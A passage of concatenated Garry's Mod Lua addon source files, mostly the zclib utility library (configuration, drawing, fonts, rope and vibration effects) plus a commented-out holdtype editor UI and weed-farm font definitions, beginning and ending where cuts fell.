	-- nametext:SetPos( iw*0.05, ih + fh*0.15 )
	
	-- local title = vgui.Create( "DLabel", holdframe )
	-- title:SetSize( iw*0.9, fh*0.05 )
	-- title:SetPos( iw*0.05, ih + fh*0.19 )
	-- title:SetText( "Holdtype Code:" )
	-- title:SetFont( "wOS.Anim.TitleFont" )
	
	-- local prefix = vgui.Create( "DTextEntry", holdframe )
	-- prefix:SetSize( iw*0.9, fh*0.03 )
	-- prefix:SetPos( iw*0.05, ih + fh*0.25 )
	-- prefix:SetText( "wos-custom-xxx" )
	
	-- local title2 = vgui.Create( "DLabel", holdframe )
	-- title2:SetSize( iw*0.9, fh*0.05 )
	-- title2:SetPos( iw*0.05, ih + fh*0.29 )
	-- title2:SetText( "Current Action:" )
	-- title2:SetFont( "wOS.Anim.TitleFont" )
	
	-- local DComboBox = vgui.Create( "DComboBox", holdframe )
	-- DComboBox:SetSize( iw*0.9, fh*0.03 )
	-- DComboBox:SetPos( iw*0.05, ih + fh*0.35 )
	-- DComboBox:SetValue( "Idle Standing" )
	-- for act, _ in pairs( ACTS ) do
		-- DComboBox:AddChoice( act )
	-- end
	
	-- local AddSeq = vgui.Create( "DButton", holdframe )
	-- AddSeq:SetSize( iw*0.9, fh*0.05 )
	-- AddSeq:SetPos( iw*0.05, fh*0.515 )
	-- AddSeq:SetText( "" )
	-- AddSeq.Paint = function( pan, ww, hh )
		-- draw.RoundedBox( 5, 0, 0, ww, hh, ( pan:IsDown() and Color( 0, 55, 155, 155 ) ) or Color( 155, 155, 155, 155 ) )
		-- draw.SimpleText( "Add Selected Sequence", "wOS.Anim.DescFont", ww/2, hh/2, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
	-- end
	
	-- local AppList = vgui.Create( "DListView", holdframe )
	-- AppList:SetSize( iw*0.9, fh*0.3 )
	-- AppList:SetPos( iw*0.05, fh*0.6 )
	-- AppList:SetMultiSelect( false )
	-- AppList:AddColumn( "Animation" )
	-- AppList:AddColumn( "Weight" )
	-- AppList.OnRowRightClick = function( pan, id, line )
		-- if pan.ItemIconOptions then pan.ItemIconOptions:Remove() pan.ItemIconOptions = nil end
		-- pan.ItemIconOptions = DermaMenu( AppList )
		-- pan.ItemIconOptions:MakePopup()
		-- pan.ItemIconOptions:SetPos( gui.MouseX(), gui.MouseY() )
		-- pan.ItemIconOptions.Think = function( self )
			-- if not pan then self:Remove() end
		-- end
		-- pan.ItemIconOptions:AddOption( "Change Weight", function( self ) 

			-- local Scratch = vgui.Create( "DNumberScratch", holdframe:GetParent() )
			-- Scratch:SetSize( 1, 1 )
			-- Scratch:Center()
			-- Scratch:MakePopup()
			-- Scratch:SetValue( pan.Selections[ pan.ActSelect ][ line:GetValue( 1 ) ]*100 or 100 )
			-- Scratch:SetMin( 0 )
			-- Scratch:SetMax( 100 )
			-- Scratch.OnMousePressed = function() end
			-- Scratch.OnMouseReleased = function() end
			-- Scratch.OnValueChanged = function( panz )
				-- pan.Selections[ pan.ActSelect ][ line:GetValue( 1 ) ] = math.Round( panz:GetFloatValue() )/100
			-- end
			-- Scratch.Think = function( panz )
				-- if input.IsMouseDown( MOUSE_LEFT ) or input.IsMouseDown( MOUSE_RIGHT ) then
					-- panz:Remove()
					-- AppList:ReloadAll()
					-- return
				-- end
				-- panz:SetActive( true )
				-- panz:MouseCapture( true )
				-- panz:LockCursor()
				-- if ( !system.IsLinux() ) then
					-- panz:SetCursor( "none" )
				-- end
				-- panz:SetShouldDrawScreen( true )
			-- end
			-- hook.Add( "DrawOverlay", "wOS.AnimExtension.ReallyFuckedUpWorkAround", function()
				-- if ( !IsValid( Scratch ) ) then hook.Remove( "DrawOverlay", "wOS.AnimExtension.ReallyFuckedUpWorkAround" ) return end
				-- Scratch:PaintScratchWindow()
			-- end )
			-- self:Remove()
		-- end )	
		-- pan.ItemIconOptions:AddOption( "Remove", function( self ) 
			-- pan.Selections[ pan.ActSelect ][ line:GetValue( 1 ) ] = nil
			-- pan:RemoveLine( id )
			-- self:Remove()
		-- end )	
	-- end
	-- AppList.Selections = {}
	-- AppList.ActSelect = DComboBox:GetValue()
	-- AppList.ReloadAll = function( pan ) 
		-- pan:Clear()
		-- if pan.Selections[ pan.ActSelect ] then
			-- for sequence, weight in pairs( pan.Selections[ pan.ActSelect ] ) do
				-- pan:AddLine( sequence, weight * 100 .. "%" )
			-- end
		-- end
	-- end
	-- AppList:ReloadAll()
	
	-- AddSeq.DoClick = function( pan )
		-- local l = lister:GetSelected()[1]
		-- if l then
			-- AppList:AddLine( l:GetValue(1), "100%" )
			-- if not AppList.Selections[ AppList.ActSelect ] then
				-- AppList.Selections[ AppList.ActSelect ] = {}
			-- end
			-- AppList.Selections[ AppList.ActSelect ][ l:GetValue(1) ] = 1
		-- end
	-- end
	
	-- DComboBox.OnSelect = function( panel, index, value )
		-- AppList.ActSelect = value
		-- AppList:ReloadAll()
	-- end
	
	-- togglebutt.DoClick = function( pan )
		-- holdframe.Expand = !holdframe.Expand
		-- if !holdframe.Expand then
			-- basetype:SetText( "" )
			-- nametext:SetText( "" )
			-- prefix:SetText( "wos-custom-xxx" )
			-- DComboBox:SetValue( "Idle Standing" )
			-- AppList.ActSelect = "Idle Standing"
			-- AppList.Selections = {}
			-- AppList:ReloadAll()
		-- end
	-- end
	
	-- local CreateHoldType = vgui.Create( "DButton", holdframe )
	-- CreateHoldType:SetSize( iw*0.9, fh*0.05 )
	-- CreateHoldType:SetPos( iw*0.05, fh*0.925 )
	-- CreateHoldType:SetText( "" )
	-- CreateHoldType.Paint = function( pan, ww, hh )
		-- draw.RoundedBox( 5, 0, 0, ww, hh, ( pan:IsDown() and Color( 0, 55, 155, 155 ) ) or Color( 155, 155, 155, 155 ) )
		-- draw.SimpleText( "Print Holdtype ( Console )", "wOS.Anim.DescFont", ww/2, hh/2, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
	-- end
	-- CreateHoldType.DoClick = function( pan )
		-- chat.AddText( color_white, "[", Color( 0, 175, 255 ), "wOS", color_white, "] The Holdtype code has been printed into console!" )
		-- local name = ( nametext:GetText():len() > 0 and nametext:GetText() ) or "Rename Me" 
		-- local pref = ( prefix:GetText():len() > 0 and prefix:GetText() ) or "wos-custom-xxx" 
		-- local base = ( basetype:GetText():len() > 0 and basetype:GetText() ) or "normal"
		-- print( [[--=====================================================================]] )
		-- print( [[/*		My Custom Holdtype
			-- Created by ]] .. LocalPlayer():Nick() .. [[( ]] .. LocalPlayer():SteamID() .. [[ )*/]])
		-- print( [[
-- local DATA = {}
-- DATA.Name = "]] .. name .. [["
-- DATA.HoldType = "]] .. pref .. [["
-- DATA.BaseHoldType = "]] .. base .. [["
-- DATA.Translations = {} 
-- ]])
		-- for slot, data in pairs( AppList.Selections ) do
			-- if table.Count( data ) > 0 then
				-- print( [[DATA.Translations[ ]] .. ACTS[slot] .. [[ ] = {]] )
				-- for seq, weight in pairs( data ) do
					-- print( [[	{ Sequence = "]] .. seq .. [[", Weight = ]] .. weight .. [[ },]])
				-- end
				-- print( [[}]] )
				-- print( "" )
			-- end
		-- end
		-- print( [[wOS.AnimExtension:RegisterHoldtype( DATA )]] )
		-- print( [[--=====================================================================]] )
	-- end
	
-- end
--PATH addons/zeros_lua_libary/lua/zclib/sh_main_config.lua:
zclib = zclib or {}
zclib.config = zclib.config or {}

// Used for debugging the script
zclib.config.Debug = false

zclib.config.NoPrint = true

// By default i disable the net track system since if it doesent find any supported script hook then its gonna overwrite the net.Incoming function which could cause problems for other scripts who overwrite this too.
// Currently Supported Scripts: eProtect(eP:PreNetworking)
zclib.config.NetTrack = false

// The Currency
zclib.config.Currency = "$"

// Should the Currency symbol be in front or after the money value?
zclib.config.CurrencyInvert = true

// These Ranks are admins
// If xAdmin, sAdmin or SAM is installed then this table can be ignored
zclib.config.AdminRanks = {
	["owner"] = true,
	["superadmin"] = true,
	["Super Admin"] = true,
}


// The path from which we try to download the uploaded image
// Examble https://i.imgur.com/ == https://i.imgur.com/imageid.png
zclib.config.ImageSizeLimit = 5000
zclib.config.ImageServices = {
	["imgur"] = "https://i.imgur.com/",
	["imgpile"] = "https://imgpile.com/images/"
}

// zclib.config.ImageServices["folder"] = "https://AdresseToImage/"
/*
	Examble:
		Addresse to a imagefile: > https://imgpile.com/images/nnHvi2.jpg
		ImageService would be that > zclib.config.ImageServices["imgpile"] = "https://imgpile.com/images/"
		ImageID would be that > nnHvi2
*/

zclib.config.ActiveImageService = "imgur"


zclib.config.Police = {
	Jobs = {}
}

zclib.config.CleanUp = {
	SkipOnTeamChange = {}
}
//zclib.config.CleanUp.SkipOnTeamChange[TEAM_STAFF] = true

zclib.config.Inventory = {

	// If set to true then the player will get his own inventory assigned on join
	PlayerInv = false,

	// If true then items that can be picked up in the inventory will be displayed
	ShowItemPickup = false,

	// Should we drop all the players inventory in a bag once he dies?
	DropOnDeath = false,

	// What entities can be stored inside the inventory
	// NOTE Some entities will need a custom module in order to save / load all its data correctly
	AllowedItems = {
		"prop_physics",
		"weapon_",
		"weapons_",
		"durgz_",
		"drug_",
		"drugs_",
		"item_health",
		"item_battery",
		"item_ammo",
		"item_box",
		"item_rpg_round",
		"spawned_shipment",
		"spawned_weapon",
		"spawned_food",
		"food",
		"spawned_ammo",
		"m9k_",
		"ls_sniper",
		"bb_",
		"manhack_welder",
		"tfa_",
		"zss_mine",
		"combine_mine",
	},

	// Entities which we dont allow to be stored
	BannedItems = {"sent_ball"},
}


// Here you can pre define names for Classes which get used instead.
zclib.config.PredefinedNames = {
	["sent_ball"] = "Super Bouncer",
	["item_healthkit"] = "Health Kit",
	["item_ammo_357"] = "357 Ammo",
	["item_ammo_357_large"] = "357 Ammo (Large)",
	["item_ammo_ar2"] = "AR2 Ammo",
	["item_ammo_ar2_large"] = "AR2 Ammo (Large)",
	["item_ammo_ar2_altfire"] = "AR2 Orb",
	["item_ammo_crossbow"] = "Crossbow Bolts",
	["item_healthvial"] = "Health Viral",
	["item_ammo_pistol"] = "Pistol Ammo",
	["item_ammo_pistol_large"] = "Pistol Ammo (Large)",
	["item_rpg_round"] = "RPG Round",
	["item_box_buckshot"] = "Shotgun Ammo",
	["item_ammo_smg1"] = "SMG Ammo",
	["item_ammo_smg1_large"] = "SMG Ammo (Large)",
	["item_ammo_smg1_grenade"] = "SMG Grenade",
	["item_battery"] = "Suit Battery"
}

--PATH addons/zeros_lua_libary/lua/zclib/util/sh_animation.lua:
zclib = zclib or {}
zclib.Animation = zclib.Animation or {}

function zclib.Animation.Play(ent,anim, speed)
	if not IsValid(ent) then return end
	local sequence = ent:LookupSequence(anim)
	ent:SetCycle(0)
	ent:ResetSequence(sequence)
	ent:SetPlaybackRate(speed)
	ent:SetCycle(0)
end

function zclib.Animation.PlayTransition(ent,anim01, speed01,anim02,speed02)

	zclib.Animation.Play(ent,anim01, speed01)

	local time = ent:SequenceDuration() or 0
	local timerid = "zclib_anim_transition_" .. ent:EntIndex()
	zclib.Timer.Remove(timerid)

	zclib.Timer.Create(timerid, time, 1, function()
		zclib.Timer.Remove(timerid)
		zclib.Animation.Play(ent, anim02, speed02)
	end)
end

--PATH addons/zeros_lua_libary/lua/zclib/util/sh_draw.lua:
zclib = zclib or {}
zclib.util = zclib.util or {}

if CLIENT then
	function zclib.util.GetTextSize(txt,font)
		surface.SetFont(font)
		return surface.GetTextSize(txt)
	end

	function zclib.util.FontSwitch(txt,len,font01,font02)
		if zclib.util.GetTextSize(txt,font01) > len then
			return font02
		else
			return font01
		end
	end

	function zclib.util.DrawOutlinedBox(x, y, w, h, thickness, clr)
		surface.SetDrawColor(clr)

		for i = 0, thickness - 1 do
			surface.DrawOutlinedRect(x + i, y + i, w - i * 2, h - i * 2)
		end
	end

	function zclib.util.DrawBlur(p, a, d)
		local x, y = p:LocalToScreen(0, 0)

		surface.SetDrawColor(color_white)
		surface.SetMaterial(zclib.Materials.Get("blur"))

		for i = 1, d do
			zclib.Materials.Get("blur"):SetFloat("$blur", (i / d) * a)
			zclib.Materials.Get("blur"):Recompute()
			render.UpdateScreenEffectTexture()
			surface.DrawTexturedRect(x * -1, y * -1, ScrW(), ScrH())
		end
	end

	function zclib.util.DrawCircle( x, y, radius, seg )
		local cir = {}

		table.insert( cir, { x = x, y = y, u = 0.5, v = 0.5 } )
		for i = 0, seg do
			local a = math.rad( ( i / seg ) * -360 )
			table.insert( cir, { x = x + math.sin( a ) * radius, y = y + math.cos( a ) * radius, u = math.sin( a ) / 2 + 0.5, v = math.cos( a ) / 2 + 0.5 } )
		end

		local a = math.rad( 0 )
		table.insert( cir, { x = x + math.sin( a ) * radius, y = y + math.cos( a ) * radius, u = math.sin( a ) / 2 + 0.5, v = math.cos( a ) / 2 + 0.5 } )

		surface.DrawPoly( cir )
	end

	function zclib.util.DrawCircleAdv(x, y, ang, seg, p, rad, color)
		local cirle = {}

		table.insert(cirle, {
			x = x,
			y = y
		})

		for i = 0, seg do
			local a = math.rad((i / seg) * -p + ang)

			table.insert(cirle, {
				x = x + math.sin(a) * rad,
				y = y + math.cos(a) * rad
			})
		end

		surface.SetDrawColor(color)
		draw.NoTexture()
		surface.DrawPoly(cirle)
	end

	// Draws a nice little info box at the specified position
	local InfoBox_offset = Vector(-250,40)
	function zclib.util.DrawInfoBox(pos,data)
		local lenght = 0
	    local txt

	    if data.txt01 and string.len(data.txt01) > lenght then
	        lenght = string.len(data.txt01)
	        txt = data.txt01
	    end

	    if data.txt02 and string.len(data.txt02) > lenght then
	        lenght = string.len(data.txt02)
	        txt = data.txt02
	    end

	    if data.txt03 and string.len(data.txt03) > lenght then
	        lenght = string.len(data.txt03)
	        txt = data.txt03
	    end

	    local tw, _ = zclib.util.GetTextSize(txt, zclib.GetFont("zclib_font_medium")) + 20 * zclib.wM
	    draw.RoundedBox(5, pos.x - (tw / 2) - (InfoBox_offset.x * zclib.wM), pos.y - (35 * zclib.hM) - (InfoBox_offset.y * zclib.hM), tw, 70 * zclib.hM, zclib.colors["black_a200"])

	    draw.SimpleText(data.txt01, zclib.GetFont("zclib_font_medium"), pos.x - (InfoBox_offset.x * zclib.wM), pos.y - (15 * zclib.hM) - (InfoBox_offset.y * zclib.hM), color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)

	    if data.txt02 then
	        draw.SimpleText(data.txt02, zclib.GetFont("zclib_font_medium"), pos.x - (InfoBox_offset.x * zclib.wM), pos.y + (15 * zclib.hM) - (InfoBox_offset.y * zclib.hM), color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
	    end

	    if data.txt03 then
	        draw.RoundedBox(5, pos.x + (tw / 2 + 10 * zclib.wM) - (InfoBox_offset.x * zclib.wM), pos.y - (20 * zclib.hM) - (InfoBox_offset.y * zclib.hM), 50 * zclib.wM, 40 * zclib.hM, zclib.colors["black_a200"])
	        draw.SimpleText(data.txt03, zclib.GetFont("zclib_font_medium"), pos.x - (InfoBox_offset.x * zclib.wM) + (tw / 2 + 10 * zclib.wM + 25 * zclib.wM), pos.y - (InfoBox_offset.y * zclib.hM), data.txt03_color or color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
	    end

	    if data.bar_fract then
	        draw.RoundedBox(5, pos.x - (tw / 2) - (InfoBox_offset.x * zclib.wM), pos.y - (50 * zclib.hM) - (InfoBox_offset.y * zclib.hM), tw, 10 * zclib.hM, zclib.colors["black_a200"])
	        draw.RoundedBox(5, pos.x - (tw / 2) - (InfoBox_offset.x * zclib.wM), pos.y - (50 * zclib.hM) - (InfoBox_offset.y * zclib.hM), tw * data.bar_fract, 10 * zclib.hM, zclib.util.LerpColor(data.bar_fract, data.bar_col01, data.bar_col02))
	    end

	    surface.SetDrawColor(data.color)
	    surface.SetMaterial(zclib.Materials.Get("infopointer"))
	    surface.DrawTexturedRect(pos.x - 10 * zclib.wM, pos.y, zclib.wM * 350, zclib.hM * 50)
	end
end

function zclib.util.ColorToVector(col)
	return Vector((1 / 255) * col.r, (1 / 255) * col.g, (1 / 255) * col.b)
end

function zclib.util.VectorToColor(vec)
	return Color((255 / 1) * vec.x, (255 / 1) * vec.y, (255 / 1) * vec.z)
end

function zclib.util.LerpColor(t, c1, c2)
	local c3 = Color(0, 0, 0)
	c3.r = Lerp(t, c1.r, c2.r)
	c3.g = Lerp(t, c1.g, c2.g)
	c3.b = Lerp(t, c1.b, c2.b)
	c3.a = Lerp(t, c1.a, c2.a)
	return c3
end

--PATH addons/zeros_lua_libary/lua/zclib/util/cl_fonts.lua:
if SERVER then return end

zclib = zclib or {}
zclib.LoadedFonts = {}
zclib.FontData = {}

/*

	This system creates fonts on demand and only on demand

*/

zclib.Hook.Add("OnScreenSizeChanged", "zclib.LoadedFonts", function(oldWidth, oldHeight)
	zclib.LoadedFonts = {}

	zclib.Print("ScreenSize changed, Clearing font cache.")
end)

function zclib.GetFont(id)
	if zclib.LoadedFonts[id] then
		// Font already exists
		return id
	else

		local FontData = zclib.FontData[id] or zclib.FontData["zclib_font_big"]

		// Linux needs everything to be lowercase
		//if system.IsLinux() then
			FontData.font = string.lower(FontData.font)
		//end

		// Create Font
		surface.CreateFont(id, FontData)
		zclib.LoadedFonts[id] = true

		zclib.Print("Font " .. id .. " cached!")
		return id
	end
end

function zclib.AddFont(id,data) zclib.FontData[id] = data end

zclib.FontData["zclib_world_font_giant"] = {
	font = "Nexa Bold",
	extended = true,
	size = 100,
	weight = 200,
	antialias = true
}

zclib.FontData["zclib_world_font_large"] = {
	font = "Nexa Bold",
	extended = true,
	size = 90,
	weight = 200,
	antialias = true
}

zclib.FontData["zclib_world_font_big"] = {
	font = "Nexa Bold",
	extended = true,
	size = 70,
	weight = 200,
	antialias = true
}

zclib.FontData["zclib_world_font_medium"] = {
	font = "Nexa Bold",
	extended = true,
	size = 50,
	weight = 200,
	antialias = true
}

zclib.FontData["zclib_world_font_mediumsmall"] = {
	font = "Nexa Bold",
	extended = true,
	size = 35,
	weight = 200,
	antialias = true
}

zclib.FontData["zclib_world_font_mediumsmoll"] = {
	font = "Nexa Bold",
	extended = true,
	size = 29,
	weight = 200,
	antialias = true
}


zclib.FontData["zclib_world_font_small"] = {
	font = "Nexa Bold",
	extended = true,
	size = 25,
	weight = 200,
	antialias = true
}

zclib.FontData["zclib_world_font_tiny"] = {
	font = "Nexa Bold",
	extended = true,
	size = 20,
	weight = 200,
	antialias = true
}

zclib.FontData["zclib_world_font_verytiny"] = {
	font = "Nexa Bold",
	extended = true,
	size = 15,
	weight = 200,
	antialias = true
}

zclib.FontData["zclib_world_font_supertiny"] = {
	font = "Nexa Bold",
	extended = true,
	size = 12,
	weight = 200,
	antialias = true
}


zclib.FontData["zclib_font_ultra"] = {
	font = "Nexa Bold",
	extended = true,
	size = ScreenScale(100),
	weight = ScreenScale(500),
	antialias = true
}

zclib.FontData["zclib_font_giant"] = {
	font = "Nexa Bold",
	extended = true,
	size = ScreenScale(40),
	weight = ScreenScale(500),
	antialias = true
}

zclib.FontData["zclib_font_huge"] = {
	font = "Nexa Bold",
	extended = true,
	size = ScreenScale(30),
	weight = ScreenScale(500),
	antialias = true
}

zclib.FontData["zclib_font_large"] = {
	font = "Nexa Bold",
	extended = true,
	size = ScreenScale(25),
	weight = ScreenScale(100),
	antialias = true
}

zclib.FontData["zclib_font_bigger"] = {
	font = "Nexa Bold",
	extended = true,
	size = ScreenScale(20),
	weight = ScreenScale(100),
	antialias = true
}

zclib.FontData["zclib_font_big"] = {
	font = "Nexa Bold",
	extended = true,
	size = ScreenScale(15),
	weight = ScreenScale(100),
	antialias = true
}


zclib.FontData["zclib_font_medium"] = {
	font = "Nexa Bold",
	extended = true,
	size = ScreenScale(10),
	weight = ScreenScale(100),
	antialias = true
}

zclib.FontData["zclib_font_medium_thin"] = {
	font = "Nexa Light",
	extended = true,
	size = ScreenScale(10),
	weight = ScreenScale(1),
	antialias = true
}

zclib.FontData["zclib_font_mediumsmall"] = {
	font = "Nexa Bold",
	extended = true,
	size = ScreenScale(8),
	weight = ScreenScale(100),
	antialias = true
}

zclib.FontData["zclib_font_mediumsmall_blur"] = {
	font = "Nexa Bold",
	extended = true,
	size = ScreenScale(8),
	weight = ScreenScale(100),
	blursize = 5,
	antialias = true
}
zclib.FontData["zclib_font_mediumsmall_thin"] = {
	font = "Nexa Light",
	extended = true,
	size = ScreenScale(8),
	weight = ScreenScale(1),
	antialias = true
}

zclib.FontData["zclib_font_mediumsmoll_thin"] = {
	font = "Nexa Light",
	extended = true,
	size = ScreenScale(7),
	weight = ScreenScale(1),
	antialias = true
}


zclib.FontData["zclib_font_small"] = {
	font = "Nexa Bold",
	extended = true,
	size = ScreenScale(6),
	weight = ScreenScale(100),
	antialias = true
}

zclib.FontData["zclib_font_smoll"] = {
	font = "Nexa Light",
	extended = true,
	size = ScreenScale(5),
	weight = ScreenScale(100),
	antialias = true
}

zclib.FontData["zclib_font_small_thin"] = {
	font = "Nexa Light",
	extended = true,
	size = ScreenScale(6),
	weight = ScreenScale(1),
	antialias = true
}

zclib.FontData["zclib_font_tiny"] = {
	font = "Nexa Bold",
	extended = true,
	size = ScreenScale(5),
	weight = ScreenScale(100),
	antialias = true
}

zclib.FontData["zclib_font_makro"] = {
	font = "Nexa Bold",
	extended = true,
	size = ScreenScale(4),
	weight = ScreenScale(100),
	antialias = true
}


zclib.FontData["zclib_font_nano"] = {
	font = "Nexa Bold",
	extended = true,
	size = ScreenScale(3.5),
	weight = ScreenScale(100),
	antialias = true
}

--PATH addons/zeros_lua_libary/lua/zclib/util/cl_rope.lua:
if SERVER then return end
zclib = zclib or {}
zclib.Rope = zclib.Rope or {}

function zclib.Rope.Setup(Length, v_start, v_end)
	local RopePoints = {}

	if v_end then
		for point = 1, Length do
			RopePoints[point] = {
				position = LerpVector((1 / Length) * point, v_start, v_end),
				velocity = vector_origin
			}
		end
	else
		for point = 1, Length do
			RopePoints[point] = {
				position = v_start,
				velocity = vector_origin
			}
		end
	end

	return RopePoints
end

local RopeOffset = Vector(0,0,10)
function zclib.Rope.Update(RopePoints, v_start, v_end, length, gravity, damping)
	// Updates the Rope points to move physicly

	if not v_end then return end
	if not v_start then return end

	// This fixes the rope breaking when both start and end are the same
	if v_end == v_start then
		v_end = v_start + RopeOffset
	end

	if isentity(v_end) then v_end = v_end:GetPos() end
	if isentity(v_start) then v_start = v_start:GetPos() end

	local dist = v_end:DistToSqr(v_start)
	dist = (dist / length) * 0.1


	for point = 1, length do
		local position1 = (RopePoints[math.Clamp(point - 1, 1, length)].position or vector_origin) - (RopePoints[point].position or vector_origin)
		local length1 = math.max(position1:Length(), dist)

		local position2 = (RopePoints[math.Clamp(point + 1, 1, length)].position or vector_origin) - (RopePoints[point].position or vector_origin)
		local length2 = math.max(position2:Length(), dist)

		local velocity = (position1 / length1) + (position2 / length2) + (gravity * 0.001)

		RopePoints[point].velocity = (RopePoints[point].velocity * damping) + velocity * (dist * 0.01)

		RopePoints[point].position = (RopePoints[point].position or vector_origin) + RopePoints[point].velocity
	end

	RopePoints[1].position = v_start
	RopePoints[length].position = v_end
end

function zclib.Rope.Draw(RopePoints, v_start, v_end, length, LineMaterial, MatSprite, color , width)
	if not v_end then return end
	if not v_start then return end

	if isentity(v_end) then v_end = v_end:GetPos() end
	if isentity(v_start) then v_start = v_start:GetPos() end

	local dist = v_end:DistToSqr(v_start)
	dist = (dist / length) * 0.1

	cam.Start3D()
		render.SetMaterial(LineMaterial)
		render.StartBeam(length)
			local tex_repeat = math.floor(dist / 50)
			tex_repeat = math.Clamp(tex_repeat, 10, 50)

			for point = 1, length do
				if RopePoints[point] then
					local tex = (tex_repeat / length) * point
					render.AddBeam(RopePoints[point].position, width or 10, tex, color)
				end
			end
		render.EndBeam()

		if MatSprite then
			render.SetMaterial(MatSprite)
			render.DrawSprite(RopePoints[length].position, 15, 15, color)
		end

	cam.End3D()
end

--PATH addons/zeros_lua_libary/lua/zclib/generic/cl_vibrate.lua:
if SERVER then return end

zclib = zclib or {}
zclib.VibrationSystem = zclib.VibrationSystem or {}

/*

    This system vibrates certain bones of machines

*/

local function RandomJiggle(Machine,boneID,intensity,Fade)
    local amount = 0.1 * intensity * Fade
    local vibrate = math.Rand(-amount, amount)
    Machine:ManipulateBonePosition(boneID, Vector(vibrate, vibrate, vibrate))
end

function zclib.VibrationSystem.Run(Machine,enabled,intensity)
    if zclib.util.InDistance(Machine:GetPos(), LocalPlayer():GetPos(), 150) == false then return end

    // Here we calculate the fade in multiplier
    local Fade = 1
    if Machine.LastState ~= enabled then
        Machine.LastState = enabled
        Machine.VibrationChange = CurTime()
    end
    Fade = math.Clamp((1 / 3) * (CurTime() - Machine.VibrationChange), 0, 1)

    // Here we jiggle the pickle
    for boneID = 1, Machine:GetBoneCount() do
        local boneName = Machine:GetBoneName(boneID)

        if boneName and string.sub(boneName, 1, 7) == "vibrate" then
            if enabled then
                RandomJiggle(Machine,boneID,intensity,Fade)
            else
                if Fade >= 1 then
                    Machine:ManipulateBonePosition(boneID, vector_origin)
                else
                    RandomJiggle(Machine,boneID,intensity,1-Fade)
                end
            end
        end
    end
end

--PATH addons/zeros_weedfarm/lua/zweedfarm/cl/zwf_fonts.lua:
if SERVER then return end



surface.CreateFont("zwf_vgui_font01", {
	font = "Arial",
	extended = true,
	size = ScreenScale( 10 ),
	weight = ScreenScale( 300 ),
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})

surface.CreateFont("zwf_vgui_font02", {
	font = "Arial",
	extended = true,
	size = ScreenScale( 7 ),
	weight = ScreenScale( 100 ),
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})

surface.CreateFont("zwf_vgui_font03", {
	font = "RUSAK",
	extended = true,
	size = ScreenScale( 14 ),
	weight = ScreenScale( 300 ),
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})

surface.CreateFont("zwf_vgui_font04", {
	font = "Arial",
	extended = true,
	size = ScreenScale( 7 ),
	weight = ScreenScale( 1000 ),
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})

surface.CreateFont("zwf_vgui_font05", {
	font = "RUSAK",
	extended = true,
	size = ScreenScale( 10 ),
	weight = ScreenScale( 300 ),
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})

surface.CreateFont("zwf_vgui_font06", {
	font = "Arial",
	extended = true,
	size = ScreenScale( 12 ),
	weight = ScreenScale( 300 ),
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})

surface.CreateFont("zwf_vgui_font06_small", {
	font = "RUSAK",
	extended = true,
	size = ScreenScale( 10 ),
	weight = ScreenScale( 300 ),
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})

surface.CreateFont("zwf_vgui_font07", {
	font = "RUSAK",
	extended = true,
	size = ScreenScale( 20 ),
	weight = ScreenScale( 300 ),
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})

surface.CreateFont("zwf_vgui_font08", {
	font = "Arial",
	extended = true,
	size = ScreenScale( 6 ),
	weight = ScreenScale( 100 ),
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})

surface.CreateFont("zwf_vgui_font09", {
	font = "Arial",
	extended = true,
	size = ScreenScale( 8 ),
	weight = ScreenScale( 500 ),
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})

surface.CreateFont("zwf_vgui_font10", {
	font = "RUSAK",
	extended = true,
	size = ScreenScale( 9 ),
	weight = ScreenScale( 300 ),
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})

surface.CreateFont("zwf_vgui_font11", {
	font = "RUSAK",
	extended = true,
	size = ScreenScale( 7 ),
	weight = ScreenScale( 300 ),
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})

surface.CreateFont("zwf_vgui_font12", {
	font = "RUSAK",
	extended = true,
	size = ScreenScale( 16 ),
	weight = ScreenScale( 15 ),
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})

surface.CreateFont("zwf_vgui_font13", {
	font = "RUSAK",
	extended = true,
	size = ScreenScale( 12 ),
	weight = ScreenScale( 100 ),
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})








surface.CreateFont("zwf_wateringcan_font01", {
